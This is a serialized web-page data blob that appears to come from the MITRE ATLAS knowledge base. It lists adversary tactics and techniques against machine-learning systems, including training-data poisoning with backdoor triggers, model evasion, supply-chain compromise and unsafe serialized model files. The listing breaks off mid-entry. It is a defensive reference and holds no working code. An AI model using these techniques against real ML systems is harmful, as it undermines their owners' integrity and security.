window.__NUXT__=(function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,_,$,aa,ab,ac,ad,ae,af,ag,ah,ai,aj,ak,al,am,an,ao,ap,aq,ar,as,at,au,av,aw,ax,ay,az,aA,aB,aC,aD,aE,aF,aG,aH,aI,aJ,aK,aL,aM,aN,aO,aP,aQ,aR,aS,aT,aU,aV,aW,aX,aY,aZ,a_,a$,ba,bb,bc,bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,bA,bB,bC,bD,bE,bF,bG,bH,bI,bJ,bK,bL,bM,bN,bO,bP,bQ,bR,bS,bT,bU,bV,bW,bX,bY,bZ,b_,b$,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr,cs,ct,cu,cv,cw,cx,cy,cz,cA,cB,cC,cD,cE,cF,cG,cH,cI,cJ,cK,cL,cM,cN,cO,cP,cQ,cR,cS,cT,cU,cV,cW,cX,cY,cZ,c_,c$,da,db,dc,dd,de,df,dg,dh,di,dj,dk,dl,dm,dn,do0,dp,dq,dr,ds,dt,du,dv,dw,dx,dy,dz,dA,dB,dC,dD,dE,dF,dG,dH,dI,dJ,dK,dL,dM,dN,dO,dP,dQ,dR,dS,dT,dU,dV,dW,dX,dY,dZ,d_,d$,ea,eb,ec,ed,ee,ef,eg,eh,ei,ej,ek,el,em,en,eo,ep,eq,er,es,et,eu,ev,ew,ex,ey,ez,eA,eB,eC,eD,eE,eF,eG,eH,eI,eJ,eK,eL,eM,eN,eO,eP,eQ,eR,eS,eT,eU,eV,eW,eX,eY,eZ,e_,e$,fa,fb,fc,fd,fe,ff,fg,fh,fi,fj,fk,fl,fm,fn,fo,fp,fq,fr,fs,ft,fu,fv,fw,fx,fy,fz,fA,fB,fC,fD,fE,fF,fG,fH,fI,fJ,fK,fL,fM,fN,fO,fP,fQ,fR,fS,fT,fU,fV,fW,fX,fY,fZ,f_,f$,ga,gb,gc,gd,ge,gf,gg,gh,gi,gj,gk,gl,gm,gn,go,gp,gq,gr,gs,gt,gu,gv,gw,gx,gy,gz,gA,gB,gC,gD,gE,gF,gG,gH,gI,gJ,gK,gL,gM,gN,gO,gP,gQ,gR,gS,gT,gU,gV,gW,gX,gY,gZ,g_,g$,ha,hb,hc,hd,he,hf,hg,hh,hi,hj,hk,hl,hm,hn,ho,hp,hq,hr,hs,ht,hu,hv,hw,hx,hy,hz,hA,hB,hC,hD,hE,hF,hG,hH,hI,hJ,hK,hL,hM,hN,hO,hP,hQ,hR,hS,hT,hU,hV,hW,hX,hY,hZ,h_,h$,ia,ib,ic,id,ie,if0,ig,ih,ii,ij,ik,il,im,in0,io,ip,iq,ir,is,it,iu,iv,iw,ix,iy,iz,iA,iB,iC,iD,iE,iF,iG,iH,iI,iJ,iK,iL,iM,iN,iO,iP,iQ,iR,iS,iT,iU,iV,iW,iX,iY,iZ,i_,i$,ja,jb,jc,jd,je,jf,jg,jh,ji,jj,jk,jl,jm,jn,jo,jp,jq,jr,js,jt,ju,jv,jw,jx,jy,jz,jA,jB,jC,jD,jE,jF,jG,jH,jI,jJ,jK,jL,jM,jN,jO,jP,jQ,jR,jS,jT,jU,jV,jW,jX,jY,jZ,j_,j$,ka,kb,kc,kd,ke,kf,kg,kh,ki,kj,kk,kl,km,kn,ko,kp,kq,kr,ks,kt,ku,kv,kw,kx,ky,kz,kA,kB,kC,kD,kE,kF,kG,kH,kI,kJ,kK,kL,kM,kN,kO,kP,kQ,kR,kS,kT,kU,kV,kW,kX,kY,kZ,k_,k$,la,lb,lc,ld,le,lf,lg,lh,li,lj,lk,ll,lm,ln,lo,lp,lq,lr,ls,lt,lu,lv,lw,lx,ly,lz,lA,lB,lC,lD,lE,lF,lG,lH,lI,lJ,lK,lL,lM,lN,lO,lP,lQ,lR,lS,lT,lU,lV,lW,lX,lY,lZ,l_,l$,ma,mb,mc,md,me,mf,mg,mh,mi,mj,mk,ml,mm,mn,mo,mp,mq,mr,ms,mt,mu,mv,mw,mx,my,mz,mA,mB,mC,mD,mE,mF,mG,mH,mI,mJ,mK,mL,mM,mN,mO,mP,mQ,mR,mS,mT,mU,mV,mW,mX,mY,mZ,m_,m$,na,nb,nc,nd,ne,nf,ng,nh,ni,nj,nk,nl,nm,nn,no,np,nq,nr,ns,nt,nu,nv,nw,nx,ny,nz,nA,nB,nC,nD,nE,nF,nG,nH,nI,nJ,nK,nL,nM,nN,nO,nP,nQ,nR,nS,nT,nU,nV,nW,nX,nY,nZ,n_,n$,oa,ob,oc,od,oe,of,og,oh,oi,oj,ok,ol,om,on,oo,op,oq,or,os,ot,ou,ov,ow,ox,oy,oz,oA,oB,oC,oD,oE,oF,oG,oH,oI,oJ,oK,oL,oM,oN,oO,oP,oQ,oR,oS,oT,oU,oV,oW,oX,oY,oZ,o_,o$,pa,pb,pc,pd,pe,pf,pg,ph,pi,pj,pk,pl,pm,pn,po,pp,pq,pr,ps,pt,pu,pv,pw,px,py,pz,pA,pB,pC,pD,pE,pF,pG,pH,pI,pJ,pK,pL,pM,pN,pO,pP,pQ,pR,pS,pT,pU,pV,pW,pX,pY,pZ,p_,p$,qa,qb,qc,qd,qe,qf,qg,qh,qi,qj,qk,ql,qm,qn,qo,qp,qq,qr,qs,qt,qu,qv,qw,qx,qy,qz,qA,qB,qC,qD,qE,qF,qG,qH,qI,qJ,qK,qL,qM,qN,qO,qP,qQ,qR,qS,qT,qU,qV,qW,qX,qY,qZ,q_,q$,ra,rb,rc,rd,re,rf,rg,rh,ri,rj,rk,rl,rm,rn,ro,rp,rq,rr,rs,rt,ru,rv,rw,rx,ry,rz,rA,rB,rC,rD,rE,rF,rG,rH,rI,rJ,rK,rL,rM,rN,rO,rP,rQ,rR,rS,rT,rU,rV,rW,rX,rY,rZ,r_,r$,sa,sb,sc,sd,se,sf,sg,sh,si,sj,sk,sl,sm,sn,so,sp,sq,sr,ss,st,su,sv,sw,sx,sy,sz,sA,sB,sC,sD,sE,sF,sG,sH,sI,sJ,sK,sL,sM,sN,sO,sP,sQ,sR,sS,sT,sU,sV,sW,sX,sY,sZ,s_,s$,ta,tb,tc,td,te,tf,tg,th,ti,tj,tk,tl,tm,tn,to,tp,tq,tr,ts,tt,tu,tv,tw,tx,ty,tz,tA,tB,tC,tD,tE,tF,tG,tH,tI,tJ,tK,tL,tM,tN,tO,tP,tQ,tR,tS,tT,tU,tV,tW,tX,tY,tZ,t_,t$,ua,ub,uc,ud,ue,uf,ug,uh,ui,uj,uk,ul,um,un,uo,up,uq,ur,us,ut,uu,uv,uw,ux,uy,uz,uA,uB,uC,uD,uE,uF,uG,uH,uI,uJ,uK,uL,uM,uN,uO,uP,uQ,uR,uS,uT,uU,uV,uW,uX,uY,uZ,u_,u$,va,vb,vc,vd,ve,vf,vg,vh,vi,vj,vk,vl,vm,vn,vo,vp,vq,vr,vs,vt,vu,vv,vw,vx,vy,vz,vA,vB,vC,vD,vE,vF,vG,vH,vI,vJ,vK,vL,vM,vN,vO,vP,vQ,vR,vS,vT,vU,vV,vW,vX,vY,vZ,v_,v$,wa,wb,wc,wd,we,wf,wg,wh,wi,wj,wk,wl,wm,wn,wo,wp,wq,wr,ws,wt,wu,wv,ww,wx,wy,wz,wA,wB,wC,wD,wE,wF,wG,wH,wI,wJ,wK,wL,wM,wN,wO,wP,wQ,wR,wS,wT,wU,wV,wW,wX,wY,wZ,w_,w$,xa,xb,xc,xd,xe,xf,xg,xh,xi,xj,xk,xl,xm,xn,xo,xp,xq,xr,xs,xt,xu,xv,xw,xx,xy,xz,xA,xB,xC,xD,xE,xF,xG,xH,xI,xJ,xK,xL,xM,xN,xO,xP,xQ,xR,xS,xT,xU,xV,xW,xX,xY,xZ,x_,x$,ya,yb,yc,yd,ye,yf,yg,yh,yi,yj,yk,yl,ym,yn,yo,yp,yq,yr,ys,yt,yu,yv,yw,yx,yy,yz,yA,yB,yC,yD,yE,yF,yG,yH,yI,yJ,yK,yL,yM,yN,yO,yP,yQ,yR,yS,yT,yU,yV,yW,yX,yY,yZ,y_,y$,za,zb,zc,zd,ze,zf,zg,zh,zi,zj,zk,zl,zm,zn,zo,zp,zq,zr,zs,zt,zu,zv,zw,zx,zy,zz,zA,zB,zC,zD,zE,zF,zG,zH,zI,zJ,zK,zL,zM,zN,zO,zP,zQ,zR,zS,zT,zU,zV,zW,zX,zY,zZ,z_,z$,Aa,Ab,Ac,Ad,Ae,Af,Ag,Ah,Ai,Aj,Ak,Al,Am,An,Ao,Ap,Aq,Ar,As,At,Au,Av,Aw,Ax,Ay,Az,AA,AB,AC,AD,AE,AF,AG,AH,AI,AJ,AK,AL,AM,AN,AO,AP,AQ,AR,AS,AT,AU,AV,AW,AX,AY,AZ,A_,A$,Ba,Bb,Bc,Bd,Be,Bf,Bg,Bh,Bi,Bj,Bk,Bl,Bm,Bn,Bo,Bp,Bq,Br,Bs,Bt,Bu,Bv,Bw,Bx,By,Bz,BA,BB,BC,BD,BE,BF,BG,BH,BI,BJ,BK,BL,BM,BN,BO,BP,BQ,BR,BS,BT,BU,BV,BW,BX,BY,BZ,B_,B$,Ca,Cb,Cc,Cd,Ce,Cf,Cg,Ch,Ci,Cj,Ck,Cl,Cm,Cn,Co,Cp,Cq,Cr,Cs,Ct,Cu,Cv,Cw,Cx,Cy,Cz,CA,CB,CC,CD,CE,CF,CG,CH,CI,CJ,CK,CL,CM,CN,CO,CP,CQ,CR,CS,CT,CU,CV,CW,CX,CY,CZ,C_,C$,Da,Db,Dc,Dd,De,Df,Dg,Dh,Di,Dj,Dk,Dl,Dm,Dn,Do,Dp,Dq,Dr,Ds,Dt,Du,Dv,Dw,Dx,Dy,Dz,DA,DB,DC,DD,DE,DF,DG,DH,DI,DJ,DK,DL,DM,DN,DO,DP,DQ,DR,DS,DT,DU,DV,DW,DX,DY,DZ,D_,D$,Ea,Eb,Ec,Ed,Ee,Ef,Eg,Eh,Ei,Ej,Ek,El,Em,En,Eo,Ep,Eq,Er,Es,Et,Eu,Ev,Ew,Ex,Ey,Ez,EA,EB,EC,ED,EE,EF,EG,EH,EI,EJ,EK,EL,EM,EN,EO,EP,EQ,ER,ES,ET,EU,EV,EW,EX,EY,EZ,E_,E$,Fa,Fb,Fc,Fd,Fe,Ff,Fg,Fh,Fi,Fj,Fk,Fl,Fm,Fn,Fo,Fp,Fq,Fr,Fs,Ft,Fu,Fv,Fw,Fx,Fy,Fz,FA,FB,FC,FD,FE,FF,FG,FH,FI,FJ,FK,FL,FM,FN,FO,FP,FQ,FR,FS,FT,FU,FV,FW,FX,FY,FZ,F_,F$,Ga,Gb,Gc,Gd,Ge,Gf,Gg,Gh,Gi,Gj,Gk,Gl,Gm,Gn,Go,Gp,Gq,Gr,Gs,Gt,Gu,Gv,Gw,Gx,Gy,Gz,GA,GB,GC,GD,GE,GF,GG,GH,GI,GJ,GK,GL,GM,GN,GO,GP,GQ,GR,GS,GT,GU,GV,GW,GX,GY,GZ,G_,G$,Ha,Hb,Hc,Hd,He,Hf,Hg,Hh,Hi,Hj,Hk,Hl,Hm,Hn,Ho,Hp,Hq,Hr,Hs,Ht,Hu,Hv,Hw,Hx,Hy,Hz,HA,HB,HC,HD,HE,HF,HG,HH,HI,HJ,HK,HL,HM,HN,HO){dA.id=dB;dA.name="Poison Training Data";dA["object-type"]=a;dA.description="Adversaries may attempt to poison datasets used by a ML model by modifying the underlying data or its labels.\nThis allows the adversary to embed vulnerabilities in ML models trained on the data that may not be easily detectable.\nData poisoning attacks may or may not require modifying the labels.\nThe embedded vulnerability is activated at a later time by data samples with an \u003Ca href='\u002Ftechniques\u002FAML.T0043.004'\u003EInsert Backdoor Trigger\u003C\u002Fa\u003E\n\nPoisoned data can be introduced via \u003Ca href='\u002Ftechniques\u002FAML.T0010'\u003EML Supply Chain Compromise\u003C\u002Fa\u003E or the data may be poisoned after the adversary gains \u003Ca href='\u002Ftactics\u002FTA0001'\u003EInitial Access\u003C\u002Fa\u003E to the system.\n";dA.tactics=[e,k];dE.id="AML.T0018";dE.name="Poison ML Model";dE["object-type"]=a;dE.description="Adversaries may poison the model by training it on poisoned data, or by interfering with its training process.\nThe poisoned model provides the adversary with a persistent artifact on the victim system.\nThe embedded vulnerability is activated at a later time by data samples with an \u003Ca href='\u002Ftechniques\u002FAML.T0043.004'\u003EInsert Backdoor Trigger\u003C\u002Fa\u003E\n";dE.tactics=[k,n];dF.id=Q;dF.name="Evade ML Model";dF["object-type"]=a;dF.description="Adversaries can \u003Ca href='\u002Ftechniques\u002FAML.T0043'\u003ECraft Adversarial Data\u003C\u002Fa\u003E that prevent a machine learning model from correctly identifying the contents of the data.\nThis technique can be used to evade a downstream task where machine learning is utilized.\nThe adversary may evade machine learning based virus\u002Fmalware detection, or network scanning towards the goal of a traditional cyber attack.\n";dF.tactics=[d,j];gH.id=l;gH["object-type"]=t;gH.name="Reconnaissance";gH.description="The adversary is trying to gather information they can use to plan future operations.\n\nReconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff\u002Fpersonnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.";gH.external_references=[{external_id:l,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0043"}];gH.techniques=[gI,gN];gI.id=N;gI.name="Search for Victim's Publicly Available Research Materials";gI["object-type"]=a;gI.description="Adversaries may search publicly available research to learn how and where machine learning is used within a victim organization.\nThe adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective.\nOrganizations often use open source model architectures trained on additional proprietary data in production.\nKnowledge of this underlying architecture allows the adversary to craft more realistic proxy models (\u003Ca href='\u002Ftechniques\u002FAML.T0005'\u003ETrain Proxy ML Model\u003C\u002Fa\u003E).\nAn adversary can search these resources for publications for authors employed at the victim organization.\n\nResearch materials may exist as academic papers published in \u003Ca href='\u002Ftechniques\u002FAML.T0000.000'\u003EJournals and Conference Proceedings\u003C\u002Fa\u003E, or stored in \u003Ca href='\u002Ftechniques\u002FAML.T0000.001'\u003EPre-Print Repositories\u003C\u002Fa\u003E, as well as \u003Ca href='\u002Ftechniques\u002FAML.T0000.002'\u003ETechnical Blogs\u003C\u002Fa\u003E.\n";gI.tactics=[l];gI.subtechniques=[gJ,gK,gM];gJ.id="AML.T0000.000";gJ.name="Journals and Conference Proceedings";gJ["object-type"]=a;gJ.description="Many of the publications accepted at premier machine learning conferences and journals come from commercial labs.\nSome journals and conferences are open access, others may require paying for access or a membership.\nThese publications will often describe in detail all aspects of a particular approach for reproducability.\nThis information can be used by adversaries to implement the paper.\n";gJ["subtechnique-of"]=N;gK.id=gL;gK.name="Pre-Print Repositories";gK["object-type"]=a;gK.description="Pre-Print repositories, such as arXiv, contain the latest academic research papers that haven't been peer reviewed.\nThey may contain research notes, or technical reports that aren't typically published in journals or conference proceedings.\nPre-print repositories also serve as a central location to share papers that have been accepted to journals.\nSearching pre-print repositories  provide adversaries with a relatively up-to-date view of what researchers in the victim organization are working on.\n";gK["subtechnique-of"]=N;gM.id="AML.T0000.002";gM.name="Technical Blogs";gM["object-type"]=a;gM.description="Research labs at academic institutions and Company R&D divisions often have blogs that highlight their use of machine learning and its application to the organizations unique problems.\nIndividual researchers also frequently document their work in blogposts.\nAn adversary may search for posts made by the target victim organization or its employees.\nIn comparison to \u003Ca href='\u002Ftechniques\u002FAML.T0000.000'\u003EJournals and Conference Proceedings\u003C\u002Fa\u003E and \u003Ca href='\u002Ftechniques\u002FAML.T0000.001'\u003EPre-Print Repositories\u003C\u002Fa\u003E this material will often contain more practical aspects of the machine learning system.\nThis could include underlying technologies and frameworks used, and possibly some information about the API access and use case.\nThis will help the adversary better understand how that organization is using machine learning internally and the details of their approach that could aid in tailoring an attack.\n";gM["subtechnique-of"]=N;gN.id="AML.T0001";gN.name="Search for Publicly Available Adversarial Vulnerability Analysis";gN["object-type"]=a;gN.description="Much like the \u003Ca href='\u002Ftechniques\u002FAML.T0000'\u003ESearch for Victim's Publicly Available Research Materials\u003C\u002Fa\u003E, there is often ample research available on the vulnerabilities of common models. Once a target has been identified, an adversary will likely try to identify any pre-existing work that has been done for this class of models.\nThis will include not only reading academic papers that may identify the particulars of a successful attack, but also identifying pre-existing implementations of those attacks. The adversary may \u003Ca href='\u002Ftechniques\u002FAML.T0016'\u003EObtain Capabilities: Adversarial ML Attack Implementations\u003C\u002Fa\u003E or \u003Ca href='\u002Ftechniques\u002FAML.T0017'\u003EDevelop Capabilities: Adversarial ML Attack Implementations\u003C\u002Fa\u003E their own if necessary.";gN.tactics=[l];gO.id=e;gO["object-type"]=t;gO.name="Resource Development";gO.description="The adversary is trying to establish resources they can use to support operations.\n\nResource Development consists of techniques that involve adversaries creating, purchasing, or compromising\u002Fstealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.";gO.external_references=[{external_id:e,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0042"}];gO.techniques=[gP,gS,gT,gU,gW,dA];gP.id=af;gP.name="Acquire Public ML Artifacts";gP["object-type"]=a;gP.description="Adversaries may search public sources, including cloud storage, public-facing services, and software or data repositories, to identify machine learning artifacts.\nThese machine learning artifacts may include the software stack used to train and deploy models, training and testing data, model configurations and parameters.\nAn adversary will be particularly interested in artifacts hosted by or associated with the victim organization as they may represent what that organization uses in a production environment.\nAdversaries may identify artifact repositories via other resources associated with the victim organization (e.g. \u003Ca href='\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E or \u003Ca href='\u002Ftechniques\u002FAML.T0000'\u003ESearch for Victim's Publicly Available Research Materials\u003C\u002Fa\u003E).\nThese ML artifacts often provide adversaries with details of the ML task and approach.\n\nML artifacts can aid in an adversary's ability to \u003Ca href='\u002Ftechniques\u002FAML.T0005'\u003ETrain Proxy ML Model\u003C\u002Fa\u003E.\nIf these artifacts include pieces of the actual model in production, they can be used to directly \u003Ca href='\u002Ftechniques\u002FAML.T0043'\u003ECraft Adversarial Data\u003C\u002Fa\u003E.\nAcquiring some artifacts requires registration (providing user details such email\u002Fname), AWS keys, or written requests, and may require the adversary to \u003Ca href='\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E.\n\nArtifacts might be hosted on victim-controlled infrastructure, providing the victim with some information on who has accessed that data.\n";gP.tactics=[e];gP.subtechniques=[gQ,gR];gQ.id=aH;gQ.name="Representative Datasets";gQ["object-type"]=a;gQ.description="Adversaries may collect datasets similar to those used by the victim organization.\nCollecting a dataset will either require the manual creation of the dataset from scratch, or modifying publicly available datasets in order to more closely match the victim system.\n\nThis is often a requirement for \u003Ca href='\u002Ftechniques\u002FAML.T0005'\u003ETrain Proxy ML Model\u003C\u002Fa\u003E.\nAn adversary may also acquire a dataset for the purposes of poisoning it and \u003Ca href='\u002Ftechniques\u002FAML.T0019'\u003EPublish Poisoned Datasets\u003C\u002Fa\u003E.\nThis could lead to \u003Ca href='\u002Ftechniques\u002FAML.T0010'\u003EML Supply Chain Compromise\u003C\u002Fa\u003E, and enable adversary goals such as \u003Ca href='\u002Ftechniques\u002FAML.T0031'\u003EErode ML Model Integrity\u003C\u002Fa\u003E and \u003Ca href='\u002Ftechniques\u002FAML.T0015'\u003EEvade ML Model\u003C\u002Fa\u003E.\n";gQ["subtechnique-of"]=af;gR.id=dx;gR.name="Representative Models";gR["object-type"]=a;gR.description="Adversaries may acquire models that are representative of those used by the victim.\nThey can be used to tailor attacks to the victim model.\n\nRepresentative models may include model architectures, or pre-trained models which define the architecture as well as model parameters from training on a dataset.\nIf the adversary only has a representative model architecture, they may create a \u003Ca href='\u002Ftechniques\u002FAML.T0005'\u003ETrain Proxy ML Model\u003C\u002Fa\u003E by training it on \u003Ca href='\u002Ftechniques\u002FAML.T0002.000'\u003ERepresentative Datasets\u003C\u002Fa\u003E, to produce a model that mimics the functionality of a private model.\n\nThe adversary may use a \u003Ca href='\u002Ftechniques\u002FAML.T0002.000'\u003ERepresentative Datasets\u003C\u002Fa\u003E to evaluate the acquired model and verify it performs well on the target data distribution.\n\nThe adversary may search public sources for common model architecture configuration file formats such as yaml or python configuration files, and common model storage file formats such as ONNX, H5, Pickle (.pkl), PyTorch (.pth), or TensorFlow (.pb).\n";gR["subtechnique-of"]=af;gS.id=dy;gS.name="Obtain Capabilities: Adversarial ML Attack Implementations";gS["object-type"]=a;gS.description="Adversaries may search for existing open source implementations of machine learning attacks. The research community often publishes their code for reproducibility and to further future research. Libraries intended for research purposes, such as CleverHans, the Adversarial Robustness Toolbox, and FoolBox, can be weaponized by an adversary. Adversaries may also obtain and use tools that were not originally designed for adversarial ML attacks as part of their attack.";gS.tactics=[e];gT.id=dz;gT.name="Develop Capabilities: Adversarial ML Attack Implementations";gT["object-type"]=a;gT.description="Adversaries may develop their own adversarial attacks. They may leverage existing libraries as a starting point (\u003Ca href='\u002Ftechniques\u002FAML.T0016'\u003EObtain Capabilities: Adversarial ML Attack Implementations\u003C\u002Fa\u003E). They may implement ideas described in public research papers or develop custom made attacks for the victim model.";gT.tactics=[e];gU.id=gV;gU.name="Acquire Infrastructure: Attack Development and Staging Workspaces";gU["object-type"]=a;gU.description="Developing and staging machine learning attacks often requires expensive compute resources.\nAdversaries may need access to one or many GPUs in order to develop an attack.\nThey may try to anonymously use free resources such as Google Colaboratory, or cloud resources such as AWS, Azure, or Google Cloud as an efficient way to stand up temporary resources to conduct operations.\nMultiple workspaces may be used to avoid detection.\n";gU.tactics=[e];gW.id="AML.T0019";gW.name="Publish Poisoned Datasets";gW["object-type"]=a;gW.description="Adversaries may \u003Ca href='\u002Ftechniques\u002FAML.T0020'\u003EPoison Training Data\u003C\u002Fa\u003E and publish it to a public location.\nThe poisoned dataset may be a novel dataset or a poisoned variant of an existing open source dataset.\nThis data may be introduced to a victim system via \u003Ca href='\u002Ftechniques\u002FAML.T0010'\u003EML Supply Chain Compromise\u003C\u002Fa\u003E.\n";gW.tactics=[e];gX.id=q;gX["object-type"]=t;gX.name="Initial Access";gX.description="The adversary is trying to get into your network.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.";gX.external_references=[{external_id:q,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0001",source_name:b}];gX.techniques=[gY];gY.id=bi;gY.name="ML Supply Chain Compromise";gY["object-type"]=a;gY.description="Adversaries may gain initial access to a system by compromising the unique portions of the ML supply chain.\nThis could include \u003Ca href='\u002Ftechniques\u002FAML.T0010.000'\u003EGPU Hardware\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0010.002'\u003EData\u003C\u002Fa\u003E and its annotations, parts of the ML \u003Ca href='\u002Ftechniques\u002FAML.T0010.001'\u003EML Software\u003C\u002Fa\u003E stack, or the \u003Ca href='\u002Ftechniques\u002FAML.T0010.003'\u003EModel\u003C\u002Fa\u003E itself.\nIn some instances the attacker will need secondary access to fully carry out an attack using compromised components of the supply chain.\n";gY.tactics=[q];gY.subtechniques=[gZ,g_,g$,ha];gZ.id="AML.T0010.000";gZ.name="GPU Hardware";gZ["object-type"]=a;gZ.description="Most machine learning systems require access to certain specialized hardware, typically GPUs.\nAdversaries can target machine learning systems by specifically targeting the GPU supply chain.\n";gZ["subtechnique-of"]=bi;g_.id="AML.T0010.001";g_.name="ML Software";g_["object-type"]=a;g_.description="Most machine learning systems rely on a limited set of machine learning frameworks.\nAn adversary could get access to a large number of machine learning systems through a comprise of one of their supply chains.\nMany machine learning projects also rely on other open source implementations of various algorithms.\nThese can also be compromised in a targeted way to get access to specific systems.\n";g_["subtechnique-of"]=bi;g$.id=dC;g$.name="Data";g$["object-type"]=a;g$.description="Data is a key vector of supply chain compromise for adversaries.\nEvery machine learning project will require some form of data.\nMany rely on large open source datasets that are publicly available.\nAn adversary could rely on compromising these sources of data.\nThe malicious data could be a result of \u003Ca href='\u002Ftechniques\u002FAML.T0020'\u003EPoison Training Data\u003C\u002Fa\u003E or include traditional malware.\n\nAn adversary can also target private datasets in the labeling phase.\nThe creation of private datasets will often require the hiring of outside labeling services.\nAn adversary can poison a dataset by modifying the labels being generated by the labeling service.\n";g$["subtechnique-of"]=bi;ha.id="AML.T0010.003";ha.name="Model";ha["object-type"]=a;ha.description="Machine learning systems often rely on open sourced models in various ways.\nMost commonly, the victim organization may be using these models for fine tuning.\nThese models will be downloaded from an external source and then used as the base for the model as it is tuned on a smaller, private dataset.\nLoading models often requires executing some saved code in the form of a saved model file.\nThese can be compromised with traditional malware, or through some adversarial machine learning techniques.\n";ha["subtechnique-of"]=bi;hb.id=w;hb.name="ML Model Access";hb["object-type"]=t;hb.description="An adversary is attempting to gain some level of access to a machine learning model.\n\nML Model Access consists of techniques that use various types of access to the machine learning model that can be used by the adversary to gain information, develop attacks, and as a means to input data to the model.\nThe level of access can range from the full knowledge of the internals of the model to access to the physical environment where data is collected for use in the machine learning model.\nThe adversary may use varying levels of model access during the course of their attack, from staging the attack to impacting the target system..\n";hb.techniques=[hc,hd,he,hg];hc.id=aI;hc.name="ML Model Inference API Access";hc["object-type"]=a;hc.description="Adversaries may gain access to a model via legitimate access to the inference API.\nInference API access can be a source of information to the adversary (\u003Ca href='\u002Ftechniques\u002FAML.T0013'\u003EDiscover ML Model Ontology\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0013'\u003EDiscover ML Model Family\u003C\u002Fa\u003E), a means of staging the attack (\u003Ca href='\u002Ftechniques\u002FAML.T0042'\u003EVerify Attack\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0043'\u003ECraft Adversarial Data\u003C\u002Fa\u003E), or for indroducing data to the target system for Impact (\u003Ca href='\u002Ftechniques\u002FAML.T0015'\u003EEvade ML Model\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0031'\u003EErode ML Model Integrity\u003C\u002Fa\u003E).\n";hc.tactics=[w];hd.id=dD;hd.name="ML-Enabled Product or Service";hd["object-type"]=a;hd.description="Adversaries may use a product or service that uses machine learning under the hood to gain access to the underlying machine learning model.\nThis type of indirect model access may reveal details of the ML model or its inferences in logs or metadata.\n";hd.tactics=[w];he.id=hf;he.name="Physical Environment Access";he["object-type"]=a;he.description="In addition to the attacks that take place purely in the digital domain, adversaries may also exploit the physical environment for their attacks.\nIf the model is interacting with data collected from the real world in some way, the adversary can influence the model through access to wherever the data is being collected.\nBy modifying the data in the collection process, the adversary can perform modified versions of attacks designed for digital access.\n";he.tactics=[w];hg.id="AML.T0044";hg.name="Full ML Model Access";hg["object-type"]=a;hg.description="Adversaries may gain full \"white-box\" access to a machine learning model.\nThis means the adversary has complete knowledge of the model architecture, its parameters, and class ontology.\nThey may exfiltrate the model to \u003Ca href='\u002Ftechniques\u002FAML.T0043'\u003ECraft Adversarial Data\u003C\u002Fa\u003E and \u003Ca href='\u002Ftechniques\u002FAML.T0042'\u003EVerify Attack\u003C\u002Fa\u003E in an offline where it is hard to detect their behavior.\n";hg.tactics=[w];hh.id=p;hh["object-type"]=t;hh.name="Execution";hh.description="The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ";hh.external_references=[{external_id:p,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0002",source_name:b}];hh.techniques=[hi];hi.id="AML.T0011";hi.name="User Execution: Unsafe ML Artifacts";hi["object-type"]=a;hi.description="Adversaries may develop unsafe ML artifacts that when executed have a deleterious effect.\nThe adversary can use this technique to establish persistent access to systems.\nThese models may be introduced via a \u003Ca href='\u002Ftechniques\u002FAML.T0010'\u003EML Supply Chain Compromise\u003C\u002Fa\u003E.\n\nSerialization of models is a popular technique for model storage, transfer, and loading.\nHowever, this format without proper checking presents an opportunity for code execution.\n";hi.tactics=[p];hj.id=k;hj["object-type"]=t;hj.name="Persistence";hj.description="The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ";hj.external_references=[{external_id:k,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0003",source_name:b}];hj.techniques=[dA,dE];hk.id=d;hk["object-type"]=t;hk.name="Defense Evasion";hk.description="The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling\u002Fdisabling security software or obfuscating\u002Fencrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ";hk.external_references=[{external_id:d,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0005",source_name:b}];hk.techniques=[dF];hl.id=i;hl["object-type"]=t;hl.name="Discovery";hl.description="The adversary is trying to figure 